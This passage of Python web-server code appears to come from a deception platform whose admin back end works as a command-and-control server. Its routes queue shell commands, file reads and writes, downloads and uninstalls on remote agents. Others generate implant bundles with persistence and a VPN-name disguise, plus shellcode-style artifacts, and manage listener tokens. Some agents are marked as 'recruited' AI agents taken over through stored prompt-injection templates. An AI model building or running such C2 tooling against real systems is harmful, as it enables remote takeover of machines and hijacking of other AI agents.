    file_path: str = Form(""),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    args = {}
    if task_type == "read_file":
        args["path"] = file_path or command
    elif task_type == "write_file":
        args["path"] = file_path
        args["content"] = command

    return _queue_sensitive_action(
        request,
        action="c2_send_command",
        params={
            "agent_id": agent_id,
            "task_type": task_type,
            "command": command,
            "arguments_json": args,
        },
        return_to=f"/admin/c2/agents/{agent_id}",
        title=f"向 Agent 投递命令：{agent_id[:12]}",
        description="该操作会向目标 Agent 投递命令执行任务，请输入管理员密码确认。",
    )


@router.post("/admin/c2/agents/{agent_id}/delete")
def admin_c2_delete_agent(agent_id: str, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    return _queue_sensitive_action(
        request,
        action="delete_c2_agent",
        params={"agent_id": agent_id},
        return_to="/admin/c2/agents",
        title=f"删除 C2 Agent：{agent_id}",
        description="删除后该 Agent 及其全部任务记录将被一并移除。",
    )


def _parse_bulk_ids(raw: str) -> list[int]:
    return [int(x) for x in (raw or "").split(",") if x.strip().isdigit()]


@router.post("/admin/nodes/bulk-delete")
def admin_nodes_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, Node, _parse_bulk_ids(ids),
            module="nodes", target_type="node", ref_attr="name",
            skip=lambda n: n.is_builtin,
        )
    return _redirect("/admin/nodes")


@router.post("/admin/services/bulk-delete")
def admin_services_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, ServiceCatalog, _parse_bulk_ids(ids),
            module="services", target_type="service", ref_attr="service_key",
        )
    return _redirect("/admin/services")


@router.post("/admin/templates/bulk-delete")
def admin_templates_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, ServiceTemplate, _parse_bulk_ids(ids),
            module="templates", target_type="template", ref_attr="name",
        )
    return _redirect("/admin/templates")


@router.post("/admin/decoys/templates/bulk-delete")
def admin_decoy_templates_bulk_delete(
    request: Request,
    ids: str = Form(""),
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)

    def _drop_deployments(s: Session, item: DecoyTemplate) -> None:
        for dep in s.scalars(
            select(DecoyDeployment).where(DecoyDeployment.template_id == item.id)
        ).all():
            s.delete(dep)

    with SessionLocal() as s:
        _bulk_delete_entities(
            s,
            user,
            DecoyTemplate,
            _parse_bulk_ids(ids),
            module="decoys",
            target_type="decoy-template",
            ref_attr="name",
            pre_delete=_drop_deployments,
        )
    return _redirect(return_to or "/admin/decoy-management")


@router.post("/admin/prompt-injection/bulk-delete")
def admin_prompt_injection_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, PromptInjectionTemplate, _parse_bulk_ids(ids),
            module="prompt-injection", target_type="prompt-template", ref_attr="name",
        )
    return _redirect("/admin/prompt-injection")


@router.post("/admin/jsonp-templates/bulk-delete")
def admin_jsonp_templates_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, JsonpTemplate, _parse_bulk_ids(ids),
            module="jsonp-templates", target_type="jsonp-template", ref_attr="name",
        )
    return _redirect("/admin/jsonp-templates")


@router.post("/admin/internet-systems/bulk-delete")
def admin_internet_systems_bulk_delete(request: Request, ids: str = Form(""), db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    with SessionLocal() as s:
        _bulk_delete_entities(
            s, user, InternetSystem, _parse_bulk_ids(ids),
            module="internet-systems", target_type="internet-system", ref_attr="domain",
        )
    return _redirect("/admin/internet-systems")


@router.post("/admin/c2/agents/bulk-delete")
def admin_c2_bulk_delete(
    request: Request,
    agent_ids: str = Form(""),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    ids = [a.strip() for a in agent_ids.split(",") if a.strip()]
    return _queue_sensitive_action(
        request,
        action="bulk_delete_c2_agents",
        params={"agent_ids": ids},
        return_to="/admin/c2/agents",
        title="批量删除 C2 Agent",
        description="该操作会批量删除所选 Agent，请输入管理员密码确认。",
    )


@router.post("/admin/c2/send-template")
def admin_c2_send_template(
    request: Request,
    agent_id: str = Form(""),
    template_id: str = Form(""),
    custom_command: str = Form(""),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    templates = get_task_templates()
    tmpl = next((t for t in templates if t["id"] == template_id), None)

    task_type = "cmd"
    command = custom_command
    args = {}

    if tmpl and not custom_command:
        task_type = tmpl.get("task_type", "cmd")
        command = tmpl.get("command", "")
        args = tmpl.get("arguments_json", {})

    if not command.strip():
        return _redirect(f"/admin/c2/agents/{agent_id}")

    return _queue_sensitive_action(
        request,
        action="c2_send_template",
        params={
            "agent_id": agent_id,
            "task_type": task_type,
            "command": command,
            "arguments_json": args,
        },
        return_to=f"/admin/c2/agents/{agent_id}",
        title=f"向 Agent 投递模板：{agent_id[:12]}",
        description="该操作会向目标 Agent 投递模板任务，请输入管理员密码确认。",
    )


@router.post("/admin/c2/bulk-cmd")
def admin_c2_bulk_cmd(
    request: Request,
    agent_ids: str = Form(""),
    command: str = Form(""),
    task_type: str = Form("cmd"),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    ids = [a.strip() for a in agent_ids.split(",") if a.strip()]
    if not ids or not command.strip():
        return _redirect("/admin/c2/agents")
    return _queue_sensitive_action(
        request,
        action="c2_bulk_cmd",
        params={
            "agent_ids": ids,
            "task_type": task_type,
            "command": command,
            "arguments_json": {},
        },
        return_to="/admin/c2/agents",
        title=f"批量投递命令：{len(ids)} 个 Agent",
        description="该操作会向多个 Agent 同时投递任务，请输入管理员密码确认。",
    )


@router.get("/api/admin/c2/tasks")
def api_admin_c2_tasks(
    request: Request,
    agent_id: str = "",
    since_id: int = 0,
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    stmt = select(C2Task).order_by(desc(C2Task.id)).limit(50)
    if agent_id:
        stmt = select(C2Task).where(C2Task.agent_id == agent_id).order_by(desc(C2Task.id)).limit(50)
    if since_id > 0:
        stmt = stmt.where(C2Task.id > since_id)
    tasks = db.scalars(stmt).all()
    return {
        "tasks": [
            {
                "id": t.id,
                "task_type": t.task_type,
                "status": t.status,
                "command": (t.command or "")[:100],
                "output": (t.output or "")[:500],
                "created_at": t.created_at.isoformat(),
                "completed_at": t.completed_at.isoformat() if t.completed_at else None,
            }
            for t in tasks
        ]
    }


@router.get("/api/admin/c2/agents/{agent_id}/chat")
def api_admin_c2_agent_chat(agent_id: str, request: Request, db: Session = Depends(get_db)):
    """Chat-console feed: recent tasks (asc) plus a presence snapshot.

    The console diffs by task id + status + output length, so returning the
    last 100 tasks unconditionally keeps status transitions (dispatched →
    completed with output) flowing without extra bookkeeping.
    """
    _require_user(request, db)
    agent = get_agent(db, agent_id)
    if not agent:
        return JSONResponse({"error": "agent_not_found"}, status_code=404)
    tasks = list_tasks(db, agent_id=agent_id, limit=100)
    tasks_asc = list(reversed(tasks))
    return {
        "agent": {
            "agent_id": agent.agent_id,
            "status": agent.status,
            "last_seen_at": agent.last_seen_at.isoformat() if agent.last_seen_at else None,
            "poll_interval": agent.poll_interval,
        },
        "tasks": [serialize_task_full(t) for t in tasks_asc],
    }


@router.post("/api/admin/c2/agents/{agent_id}/chat")
async def api_admin_c2_agent_chat_send(agent_id: str, request: Request, db: Session = Depends(get_db)):
    """Send one natural-language (or shell) instruction from the chat console."""
    user = _require_admin(request, db)
    agent = get_agent(db, agent_id)
    if not agent:
        return JSONResponse({"error": "agent_not_found"}, status_code=404)
    try:
        body = await request.json()
    except Exception:
        body = {}
    message = str(body.get("message") or "").strip()
    task_type = str(body.get("task_type") or "").strip() or "nl_instruct"
    if task_type not in {"nl_instruct", "cmd", "read_file", "write_file", "download", "uninstall"}:
        task_type = "cmd"
    if not message:
        return JSONResponse({"error": "empty_message"}, status_code=400)
    task = enqueue_task(
        db,
        agent_id=agent_id,
        task_type=task_type,
        command=message,
        created_by=user.username,
    )
    log_execution(
        db,
        actor_username=user.username,
        action="send_message",
        module="c2",
        target_type="agent",
        target_ref=agent_id,
        detail_json={"task_id": task.id, "task_type": task_type},
    )
    return {"task": serialize_task_full(task)}


@router.get("/api/admin/c2/beacons")
def api_admin_c2_beacons(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    auto_mark_offline(db, offline_seconds=300)
    agents = list_agents(db, limit=200)
    return {
        "beacons": [
            {
                "id": a.agent_id,
                "external": a.source_ip,
                "internal": a.metadata_json.get("internal_ip", "") if a.metadata_json else "",
                "user": a.username or "unknown",
                "computer": a.hostname or "unknown",
                "os": f"{a.os_name or '?'} {a.os_version or ''}".strip(),
                "arch": a.arch or "?",
                "privileges": a.privileges or "?",
                "status": a.status,
                "last": a.last_seen_at.strftime("%H:%M:%S"),
                "first": a.first_seen_at.strftime("%m-%d %H:%M"),
                "note": a.payload_type or "",
                "kind": "recruited"
                if (a.metadata_json or {}).get("recruited_via") == "prompt_injection"
                else "implant",
                "poll_interval": a.poll_interval,
                "task_count": agent_task_count(db, a.agent_id),
            }
            for a in agents
        ]
    }


@router.get("/api/admin/c2/beacon/{agent_id}")
def api_admin_c2_beacon_detail(agent_id: str, request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    agent = get_agent(db, agent_id)
    if not agent:
        return {"error": "not found"}
    tasks = list_tasks(db, agent_id=agent_id, limit=50)
    templates = get_task_templates()
    return {
        "beacon": {
            "id": agent.agent_id,
            "external": agent.source_ip,
            "internal": agent.metadata_json.get("internal_ip", "") if agent.metadata_json else "",
            "user": agent.username or "unknown",
            "computer": agent.hostname or "unknown",
            "os": f"{agent.os_name or '?'} {agent.os_version or ''}".strip(),
            "arch": agent.arch or "?",
            "privileges": agent.privileges or "?",
            "status": agent.status,
            "last": agent.last_seen_at.strftime("%Y-%m-%d %H:%M:%S"),
            "first": agent.first_seen_at.strftime("%Y-%m-%d %H:%M:%S"),
            "note": agent.payload_type or "",
            "kind": "recruited"
            if (agent.metadata_json or {}).get("recruited_via") == "prompt_injection"
            else "implant",
            "poll_interval": agent.poll_interval,
            "task_count": agent_task_count(db, agent_id),
        },
        "tasks": [
            {
                "id": t.id,
                "task_type": t.task_type,
                "status": t.status,
                "command": t.command or "",
                "output": t.output or "",
                "created_at": t.created_at.strftime("%H:%M:%S"),
                "completed_at": t.completed_at.strftime("%H:%M:%S") if t.completed_at else None,
            }
            for t in tasks
        ],
        "templates": templates,
    }


@router.post("/api/admin/c2/beacon/{agent_id}/cmd")
async def api_admin_c2_send_cmd(agent_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    try:
        body = await request.json()
        command = body.get("command", body.get("cmd", ""))
        task_type = body.get("task_type", "cmd")
    except Exception:
        form = await request.form()
        command = form.get("command", form.get("cmd", ""))
        task_type = form.get("task_type", "cmd")
    if not command or not command.strip():
        return {"error": "empty command"}
    task = enqueue_task(
        db,
        agent_id=agent_id,
        task_type=task_type,
        command=command,
        created_by=user.username,
    )
    log_execution(
        db,
        actor_username=user.username,
        action="send_cmd",
        module="c2",
        target_type="agent",
        target_ref=agent_id,
    )
    return {"status": "ok", "task_id": task.id, "command": command}


@router.get("/api/admin/c2/stats")
def api_admin_c2_stats(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    stats = agent_stats(db)
    return {
        "beacons_total": stats["total"],
        "beacons_active": stats["active"],
        "tasks_total": stats["total_tasks"],
        "tasks_completed": stats["completed_tasks"],
    }


@router.get("/admin/c2/console", response_class=HTMLResponse)
def admin_c2_console(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    return _render(request, "admin/c2_console.html", {"user": user, "title": "C2 Console"})


@router.post("/admin/c2/bundler/generate")
def admin_c2_bundler_generate(
    request: Request,
    bundle_type: str = Form("linux"),
    c2_server: str = Form(""),
    vpn_name: str = Form("OpenVPN"),
    vpn_url: str = Form(""),
    poll_interval: int = Form(10),
    persistence: bool = Form(True),
    listener_id: int = Form(0),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.bundler import BUNDLE_GENERATORS

    generator = BUNDLE_GENERATORS.get(bundle_type)
    if not generator:
        raise HTTPException(status_code=400, detail=f"unknown bundle type: {bundle_type}")

    cfg = get_settings()
    host = cfg.payload_callback_host or f"http://{cfg.host}:{cfg.port}"
    c2_addr = c2_server or host

    # Bind the bundled implant to a C2 listener: its registration token rides
    # along so the first heartbeat authenticates against that listener.
    registration_token = ""
    if listener_id:
        from app.services.c2_service import get_listener

        listener = get_listener(db, int(listener_id))
        if not listener or not listener.is_enabled:
            raise HTTPException(status_code=400, detail="listener not found or disabled")
        registration_token = listener.registration_token or ""

    spec = generator(
        c2_server=c2_addr,
        vpn_name=vpn_name,
        poll_interval=poll_interval,
        persistence=persistence,
        registration_token=registration_token,
    )

    log_execution(
        db,
        actor_username=user.username,
        action="generate_bundle",
        module="c2",
        target_type="bundler",
        target_ref=spec.bundle_id,
    )

    from app.services.events import create_event as create_ev, extract_client_ip, filtered_headers

    create_ev(
        db,
        site_id=cfg.site_id,
        session_id=f"bundle-{spec.bundle_id}",
        source_ip=extract_client_ip(request),
        method=request.method,
        path=request.url.path,
        status_code=200,
        event_type="c2_bundle_generated",
        user_agent=request.headers.get("user-agent", ""),
        headers_json=filtered_headers(request),
        payload_json={
            "bundle_type": bundle_type,
            "agent_id": spec.agent_id,
            "tracking_id": spec.tracking_id,
        },
        signals_json=["c2_bundle_generated", f"bundle_type_{bundle_type}"],
        risk_score=95,
        decision="observe",
    )
    from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher

    get_alert_dispatcher().start_event(
        AlertPayload(
            event_type="c2_bundle_generated",
            source_ip=extract_client_ip(request),
            decision="observe",
            risk_score=95,
            signals=["c2_bundle_generated", f"bundle_type_{bundle_type}"],
            path=request.url.path,
            method=request.method,
            summary=f"C2 bundle generated: type={bundle_type}, agent={spec.agent_id} (score=95)",
            timestamp=datetime.now(timezone.utc),
        )
    )

    return Response(
        content=spec.content,
        media_type=spec.mime_type,
        headers={"Content-Disposition": f'attachment; filename="{spec.filename}"'},
    )


# ---------------------------------------------------------------------------
# C2 Listeners
# ---------------------------------------------------------------------------


@router.get("/api/admin/c2/listeners")
def api_c2_listeners(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    listeners = db.scalars(select(C2Listener).order_by(C2Listener.name)).all()
    return [
        {
            "id": listener.id,
            "name": listener.name,
            "protocol": listener.protocol,
            "bind_address": listener.bind_address,
            "bind_port": listener.bind_port,
            "domain": listener.domain,
            "status": listener.status,
            "is_enabled": listener.is_enabled,
            # The implant console is operator-facing; without exposing the
            # registration token there was no way to hand a beacon its
            # credential at all (creation/rotation included).
            "registration_token": listener.registration_token or "",
            "has_token": bool(listener.registration_token),
        }
        for listener in listeners
    ]


@router.post("/api/admin/c2/listeners")
def api_c2_listeners_create(
    request: Request,
    name: str = Form(...),
    protocol: str = Form("http"),
    bind_address: str = Form("0.0.0.0"),
    bind_port: int = Form(8080),
    domain: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.c2_service import create_listener, get_listener_by_name

    if get_listener_by_name(db, name):
        raise HTTPException(status_code=409, detail="listener name already exists")
    listener = create_listener(
        db,
        name=name,
        protocol=protocol,
        bind_address=bind_address,
        bind_port=bind_port,
        domain=domain,
        created_by=user.username,
    )
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="c2",
        target_type="listener",
        target_ref=listener.name,
    )
    return {"status": "ok", "id": listener.id, "registration_token": listener.registration_token}


@router.post("/api/admin/c2/listeners/{listener_id}/rotate")
def api_c2_listeners_rotate(listener_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.c2_service import rotate_listener_token

    listener = rotate_listener_token(db, listener_id)
    if not listener:
        raise HTTPException(status_code=404, detail="listener not found")
    log_execution(
        db,
        actor_username=user.username,
        action="rotate_token",
        module="c2",
        target_type="listener",
        target_ref=listener.name,
    )
    return {"status": "ok", "id": listener.id, "registration_token": listener.registration_token}


@router.get("/api/admin/dashboard/stats")
def api_admin_dashboard(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return {
        "stats": dashboard_stats(db),
        "trends": attack_trends(db),
        "chain": attack_chain(db),
    }


@router.get("/api/admin/attacks")
def api_admin_attacks(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return {"items": aggregated_attacks(db, limit=200)}


@router.get("/api/admin/attack-sources")
def api_admin_attack_sources(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return {"items": aggregated_attack_sources(db, limit=200)}


@router.get("/api/admin/login-logs/stats")
def api_admin_login_logs_stats(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return {
        "total": int(db.scalar(select(func.count()).select_from(LoginLog)) or 0),
        "success": int(
            db.scalar(
                select(func.count()).select_from(LoginLog).where(LoginLog.login_status == "success")
            )
            or 0
        ),
        "failed": int(
            db.scalar(
                select(func.count()).select_from(LoginLog).where(LoginLog.login_status == "failed")
            )
            or 0
        ),
    }


@router.get("/api/admin/users")
def api_admin_users(request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    items = db.scalars(select(User).order_by(User.username)).all()
    return {
        "items": [
            {
                "id": item.id,
                "username": item.username,
                "name": item.name,
                "email": item.email,
                "role": item.role,
                "is_active": item.is_active,
            }
            for item in items
        ]
    }


# ---------------------------------------------------------------------------
# Knowledge base
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Managed-host console (ported from PentestManusWeb managed_hosts / ManagedClientConsole)
# ---------------------------------------------------------------------------


@router.get("/api/admin/managed/overview")
def api_managed_overview(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services.managed_runtime import build_overview

    return build_overview(db)


@router.post("/api/admin/managed/hosts/{host_id}/note")
async def api_managed_host_note(
    host_id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    from app.models.managed import ManagedHost

    body = await request.json()
    host = db.get(ManagedHost, host_id)
    if not host:
        raise HTTPException(status_code=404, detail="host not found")
    metadata = host.metadata_json or {}
    if "note" in body:
        metadata["note"] = str(body.get("note") or "")[:500]
    if "beaconIntervalSeconds" in body:
        try:
            metadata["beaconIntervalSeconds"] = max(
                1, min(int(body["beaconIntervalSeconds"]), 3600)
            )
        except (TypeError, ValueError):
            pass
    host.metadata_json = metadata
    db.add(host)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="managed-console",
        target_type="host",
        target_ref=str(host_id),
    )
    return {"ok": True}


@router.delete("/api/admin/managed/hosts/{host_id}")
def api_managed_host_delete(
    host_id: int,
    request: Request,
    force: bool = False,
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.models.managed import ManagedEvidence, ManagedHost, ManagedSession, ManagedTask

    host = db.get(ManagedHost, host_id)
    if not host:
        raise HTTPException(status_code=404, detail="host not found")
    task_count = len(db.scalars(select(ManagedTask).where(ManagedTask.host_id == host_id)).all())
    if task_count and not force:
        return JSONResponse(
            {"detail": f"host has {task_count} tasks; retry with force=true"},
            status_code=409,
        )
    db.query(ManagedTask).filter(ManagedTask.host_id == host_id).delete()
    db.query(ManagedEvidence).filter(ManagedEvidence.host_id == host_id).delete()
    db.query(ManagedSession).filter(ManagedSession.host_id == host_id).delete()
    db.delete(host)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="delete",
        module="managed-console",
        target_type="host",
        target_ref=str(host_id),
    )
    return {"ok": True, "id": host_id, "cascade": True}


@router.post("/api/admin/managed/tasks")
async def api_managed_task_create(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.managed_runtime import enqueue_managed_task

    body = await request.json()
    try:
        task = enqueue_managed_task(
            db,
            host_id=int(body.get("hostId") or 0),
            task_type=str(body.get("taskType") or "command_run"),
            command_text=str(body.get("commandText") or ""),
            arguments=body.get("arguments") or {},
            created_by=user.username,
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    log_execution(
        db,
        actor_username=user.username,
        action="create_task",
        module="managed-console",
        target_type="task",
        target_ref=str(task.id),
    )
    return {
        "ok": True,
        "taskId": task.id,
        "status": task.status,
        "requiresApproval": task.requires_approval,
    }


@router.get("/api/admin/managed/tasks")
def api_managed_tasks(request: Request, host_id: int = 0, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.models.managed import ManagedTask
    from app.services.managed_runtime import serialize_task

    stmt = select(ManagedTask).order_by(ManagedTask.id.desc()).limit(100)
    if host_id:
        stmt = stmt.where(ManagedTask.host_id == host_id)
    return {"tasks": [serialize_task(t) for t in db.scalars(stmt).all()]}


@router.post("/api/admin/managed/tasks/{task_id}/review")
async def api_managed_task_review(task_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.managed_runtime import review_task, serialize_task

    body = await request.json()
    action = str(body.get("action") or "")
    if action not in {"approve", "reject", "cancel"}:
        raise HTTPException(status_code=400, detail="action must be approve/reject/cancel")
    task = review_task(
        db,
        task_id=task_id,
        action=action,
        reviewer=user.username,
        reason=str(body.get("reason") or ""),
    )
    if not task:
        raise HTTPException(
            status_code=409, detail=f"task cannot be {action}d in its current state"
        )
    log_execution(
        db,
        actor_username=user.username,
        action=f"task_{action}",
        module="managed-console",
        target_type="task",
        target_ref=str(task_id),
    )
    return {"ok": True, "task": serialize_task(task)}


@router.get("/api/admin/managed/listeners")
def api_managed_listeners(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.models.managed import ManagedListener
    from app.services.managed_runtime import LISTENER_TRANSPORT_OPTIONS, serialize_listener

    listeners = db.scalars(select(ManagedListener).order_by(ManagedListener.id.desc())).all()
    return {
        "listeners": [serialize_listener(item) for item in listeners],
        "transports": LISTENER_TRANSPORT_OPTIONS,
    }


@router.post("/api/admin/managed/listeners")
async def api_managed_listener_create(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    import uuid as _uuid

    from app.models.managed import ManagedListener
    from app.services.managed_runtime import normalize_transport, serialize_listener

    body = await request.json()
    name = str(body.get("name") or "").strip()
    if not name:
        raise HTTPException(status_code=400, detail="name is required")
    transport = normalize_transport(str(body.get("transport") or ""))
    token = str(body.get("registrationToken") or "").strip() or _uuid.uuid4().hex
    listener = ManagedListener(
        name=name,
        transport=transport,
        bind_address=str(body.get("bindAddress") or "0.0.0.0"),
        bind_port=int(body.get("bindPort") or 8443),
        registration_token=token,
        tls_enabled=bool(body.get("tlsEnabled")) or transport.startswith("https"),
        status=str(body.get("status") or "active"),
        metadata_json={"payloadType": transport, "approvalPolicy": {}},
        created_by=user.username,
    )
    db.add(listener)
    db.commit()
    db.refresh(listener)
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="managed-listeners",
        target_type="listener",
        target_ref=name,
    )
    data = serialize_listener(listener)
    data["registrationToken"] = token  # plaintext shown once
    return {"ok": True, "listener": data}


@router.put("/api/admin/managed/listeners/{listener_id}")
async def api_managed_listener_update(
    listener_id: int, request: Request, db: Session = Depends(get_db)
):
    user = _require_user(request, db)
    from app.models.managed import ManagedListener
    from app.services.managed_runtime import normalize_transport, serialize_listener

    body = await request.json()
    listener = db.get(ManagedListener, listener_id)
    if not listener:
        raise HTTPException(status_code=404, detail="listener not found")
    if "name" in body and str(body["name"]).strip():
        listener.name = str(body["name"]).strip()
    if "transport" in body:
        listener.transport = normalize_transport(str(body["transport"]))
        listener.metadata_json = {
            **(listener.metadata_json or {}),
            "payloadType": listener.transport,
        }
    if "bindAddress" in body:
        listener.bind_address = str(body["bindAddress"] or "0.0.0.0")
    if "bindPort" in body:
        try:
            listener.bind_port = int(body["bindPort"])
        except (TypeError, ValueError):
            pass
    if "tlsEnabled" in body:
        listener.tls_enabled = bool(body["tlsEnabled"]) or listener.transport.startswith("https")
    if "status" in body:
        listener.status = (
            str(body["status"])
            if body["status"] in {"active", "disabled", "paused"}
            else listener.status
        )
    db.add(listener)
    db.commit()
    db.refresh(listener)
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="managed-listeners",
        target_type="listener",
        target_ref=listener.name,
    )
    return {"ok": True, "listener": serialize_listener(listener)}


@router.post("/api/admin/managed/listeners/{listener_id}/rotate-token")
def api_managed_listener_rotate(listener_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    import uuid as _uuid

    from app.models.managed import ManagedListener
    from app.services.managed_runtime import serialize_listener

    listener = db.get(ManagedListener, listener_id)
    if not listener:
        raise HTTPException(status_code=404, detail="listener not found")
    listener.registration_token = _uuid.uuid4().hex
    db.add(listener)
    db.commit()
    db.refresh(listener)
    log_execution(
        db,
        actor_username=user.username,
        action="rotate-token",
        module="managed-listeners",
        target_type="listener",
        target_ref=listener.name,
    )
    data = serialize_listener(listener)
    data["registrationToken"] = listener.registration_token
    return {"ok": True, "listener": data}


@router.delete("/api/admin/managed/listeners/{listener_id}")
async def api_managed_listener_delete(
    listener_id: int, request: Request, db: Session = Depends(get_db)
):
    user = _require_admin(request, db)
    from app.models.managed import ManagedHost, ManagedListener, ManagedSession, ManagedTask

    body = await request.json()
    audit_reason = str(body.get("auditReason") or "")
    if not audit_reason.strip():
        return JSONResponse({"detail": "auditReason is required"}, status_code=400)
    listener = db.get(ManagedListener, listener_id)
    if not listener:
        raise HTTPException(status_code=404, detail="listener not found")

    cancelled = 0
    for task in db.scalars(select(ManagedTask).where(ManagedTask.listener_id == listener_id)).all():
        if task.status not in {"completed", "failed", "cancelled", "blocked"}:
            task.status = "cancelled"
            task.completed_at = datetime.now(timezone.utc)
            db.add(task)
            cancelled += 1
    closed = 0
    for session in db.scalars(
        select(ManagedSession).where(ManagedSession.listener_id == listener_id)
    ).all():
        session.listener_id = None
        session.status = "closed"
        db.add(session)
        closed += 1
    detached = 0
    for host in db.scalars(select(ManagedHost).where(ManagedHost.listener_id == listener_id)).all():
        host.listener_id = None
        host.status = "offline"
        db.add(host)
        detached += 1
    db.delete(listener)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="delete",
        module="managed-listeners",
        target_type="listener",
        target_ref=listener.name,
    )
    return {
        "ok": True,
        "id": listener_id,
        "detachedHosts": detached,
        "closedSessions": closed,
        "cancelledTasks": cancelled,
    }


@router.post("/api/admin/managed/beacons/generate")
async def api_managed_beacon_generate(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    import hashlib as _hashlib

    from app.models.managed import ManagedListener
    from app.services.managed_beacon import generate_managed_beacon

    body = await request.json()
    listener = None
    listener_id = int(body.get("listenerId") or 0)
    if listener_id:
        listener = db.get(ManagedListener, listener_id)
        if not listener:
            raise HTTPException(status_code=404, detail="listener not found")
        body["registrationToken"] = listener.registration_token
        # The agent-control API is served by the main application, not by a
        # socket on the listener's conceptual bind_port, and its scheme is the
        # deployment's own (http unless explicitly fronted). Deriving the
        # callback from the transport name produced beacons that dial
        # https://host:8443 — a port nothing listens on — so they never
        # registered and never appeared in the console. Default the callback
        # to the origin this console is being used through; explicit form
        # values always win.
        host_addr = (listener.bind_address or "").strip()
        explicit_host = str(body.get("targetHost") or "").strip()
        explicit_port = body.get("targetPort")
        if not explicit_host and host_addr and host_addr not in {"0.0.0.0", "::"}:
            body["targetHost"] = host_addr
        request_host = (request.headers.get("host") or "").split(":")[0]
        if not explicit_host and request_host:
            body["targetHost"] = request_host
        try:
            request_port = int((request.headers.get("host") or "").rsplit(":", 1)[1])
        except (IndexError, ValueError):
            request_port = 443 if request.url.scheme == "https" else 80
        if not explicit_port and request_port:
            body["targetPort"] = request_port

    build = generate_managed_beacon(body)
    build.metadata["artifactHash"] = _hashlib.sha256(build.code.encode()).hexdigest()[:16]

    log_execution(
        db,
        actor_username=user.username,
        action="generate-beacon",
        module="managed-console",
        target_type="beacon",
        target_ref=build.filename,
    )
    return {
        "ok": True,
        "code": build.code,
        "filename": build.filename,
        "metadata": build.metadata,
        "safetyNotes": build.safety_notes,
    }


@router.post("/api/admin/managed/artifacts/generate")
async def api_managed_artifact_generate(request: Request, db: Session = Depends(get_db)):
    """Cobalt Strike style artifact matrix (source: c2_control builder port)."""
    user = _require_admin(request, db)

    from app.services.c2_artifact_builder import build_artifact

    body = await request.json()
    try:
        spec = build_artifact(
            fmt=str(body.get("format") or "raw-shellcode"),
            platform=str(body.get("platform") or "linux"),
            arch=str(body.get("arch") or "x64"),
            output_type=str(body.get("outputType") or "Exe"),
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    log_execution(
        db,
        actor_username=user.username,
        action="generate-artifact",
        module="managed-console",
        target_type="artifact",
        target_ref=f"{spec.format}/{spec.platform}/{spec.filename}",
    )

    from app.services.events import create_event as create_ev, extract_client_ip, filtered_headers

    create_ev(
        db,
        site_id=get_settings().site_id,
        session_id=f"artifact-{spec.artifact_id}",
        source_ip=extract_client_ip(request),
        method=request.method,
        path=request.url.path,
        status_code=200,
        event_type="c2_artifact_generated",
        user_agent=request.headers.get("user-agent", ""),
        headers_json=filtered_headers(request),
        payload_json={
            "artifact_id": spec.artifact_id,
            "format": spec.format,
            "platform": spec.platform,
            "filename": spec.filename,
            "is_binary": spec.is_binary,
        },
        signals_json=["c2_artifact_generated"],
        risk_score=95,
        decision="observe",
    )
    from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher

    get_alert_dispatcher().start_event(AlertPayload(
        event_type="c2_artifact_generated",
